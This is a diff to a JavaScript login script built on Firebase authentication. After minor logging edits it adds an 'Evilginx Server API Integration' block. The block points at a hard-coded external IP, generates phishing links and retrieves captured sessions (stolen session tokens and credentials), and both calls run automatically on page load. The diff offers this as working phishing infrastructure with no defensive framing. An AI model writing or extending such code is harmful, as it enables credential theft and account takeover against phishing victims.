@@ -1,13 +1,14 @@
 console.log("✅ Script.js loaded successfully");
 
-// Ensure Firebase is defined before using
-if (typeof firebase !== 'undefined') {
-    console.log("✅ Firebase loaded successfully.");
-} else {
+// Ensure Firebase is ready before use
+if (typeof firebase === 'undefined') {
     console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
+} else {
+    console.log("✅ Firebase is available.");
 }
 
-document.getElementById("loginBtn")?.addEventListener("click", function () {
+// Login function
+document.getElementById("loginBtn").addEventListener("click", function () {
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
@@ -18,6 +19,7 @@ document.getElementById("loginBtn")?.addEventListener("click", function () {
 
     firebase.auth().signInWithEmailAndPassword(email, password)
         .then(() => {
+            console.log("✅ Login successful. Redirecting...");
             window.location.href = "dashboard.html";
         })
         .catch(error => {
@@ -25,3 +27,31 @@ document.getElementById("loginBtn")?.addEventListener("click", function () {
             console.error("Login Error:", error);
         });
 });
+
+// ---- Evilginx Server API Integration ----
+
+const EVILGINX_SERVER = "http://3.149.242.245:5000"; // Ensure port 5000 is included
+
+async function generatePhishingLink() {
+    try {
+        const response = await fetch(`${EVILGINX_SERVER}/generate_link`);
+        const data = await response.json();
+        console.log("Generated Link:", data);
+    } catch (error) {
+        console.error("❌ Error generating link:", error);
+    }
+}
+
+async function getCapturedSessions() {
+    try {
+        const response = await fetch(`${EVILGINX_SERVER}/captured_sessions`);
+        const data = await response.json();
+        console.log("Captured Sessions:", data);
+    } catch (error) {
+        console.error("❌ Error fetching captured sessions:", error);
+    }
+}
+
+// Example calls (Make sure buttons call these functions)
+generatePhishingLink();
+getCapturedSessions();
